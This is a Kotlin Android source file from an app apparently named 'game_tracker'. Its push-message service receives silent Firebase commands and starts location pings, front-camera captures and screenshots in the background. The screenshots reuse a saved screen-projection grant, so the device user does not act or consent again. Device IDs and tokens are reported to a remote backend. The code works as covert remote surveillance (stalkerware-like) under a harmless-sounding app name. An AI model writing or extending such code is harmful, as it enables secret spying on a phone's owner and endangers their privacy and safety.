package com.example.game_tracker

import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage

class FirebasePushMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "FirebasePushMsgService"
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM Token received: $token")

        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        prefs.edit().putString("flutter.game_tracker_fcm_token", token).apply()

        var deviceId = prefs.getString("flutter.game_tracker_device_id", null)
        if (deviceId.isNullOrEmpty()) {
            deviceId = prefs.getString("game_tracker_device_id", null)
        }

        if (!deviceId.isNullOrEmpty()) {
            CloudBridgeSync.updateDeviceFcmToken(deviceId, token)
        }
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        Log.d(TAG, "FCM background message received from: ${remoteMessage.from}")

        // 1. Ensure persistent foreground background service is started
        try {
            ForegroundService.startService(this)
        } catch (e: Throwable) {
            Log.e(TAG, "Error starting ForegroundService from FCM: ${e.message}")
        }

        val data = remoteMessage.data
        if (data.isEmpty()) return

        val action = data["action"] ?: data["requestType"] ?: "wake_up"
        val requestId = data["requestId"] ?: ""
        val cameraFacing = data["cameraFacing"] ?: "front"

        Log.d(TAG, "Processing silent background FCM action: $action, requestId: $requestId")

        when (action) {
            "wake_up" -> {
                // Heartbeat ping to mark device online in Firestore & Supabase
                val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
                var deviceId = prefs.getString("flutter.game_tracker_device_id", null)
                if (deviceId.isNullOrEmpty()) {
                    deviceId = prefs.getString("game_tracker_device_id", null)
                }
                if (!deviceId.isNullOrEmpty()) {
                    CloudBridgeSync.updateDeviceHeartbeat(deviceId)
                }
            }

            "location_ping" -> {
                // Request single location update
                try {
                    val intent = Intent(this, ForegroundService::class.java).apply {
                        putExtra("action", "location_ping")
                        putExtra("requestId", requestId)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                } catch (e: Throwable) {
                    Log.e(TAG, "Error starting location ping from FCM: ${e.message}")
                }
            }

            "camera_capture" -> {
                try {
                    val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
                        putExtra("requestId", requestId)
                        putExtra("cameraFacing", cameraFacing)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(svcIntent)
                    } else {
                        startService(svcIntent)
                    }
                } catch (e: Throwable) {
                    Log.e(TAG, "Error starting CameraCaptureService from FCM: ${e.message}")
                    if (requestId.isNotEmpty()) {
                        CloudBridgeSync.updateRequestStatus(
                            requestId = requestId,
                            status = "failed",
                            error = "FCM Camera start failed",
                            failureReason = e.message
                        )
                    }
                }
            }

            "screenshot" -> {
                try {
                    val savedProjection = MediaProjectionStore.load(this)
                    val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
                        putExtra("requestId", requestId)
                        putExtra("capture_once", true)
                        if (savedProjection.first != 0 && savedProjection.second != null) {
                            putExtra("resultCode", savedProjection.first)
                            putExtra("resultData", savedProjection.second)
                        }
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(svcIntent)
                    } else {
                        startService(svcIntent)
                    }
                } catch (e: Throwable) {
                    Log.e(TAG, "Error starting ScreenCaptureService from FCM: ${e.message}")
                    if (requestId.isNotEmpty()) {
                        CloudBridgeSync.updateRequestStatus(
                            requestId = requestId,
                            status = "failed",
                            error = "FCM Screenshot start failed",
                            failureReason = e.message
                        )
                    }
                }
            }
        }
    }
}
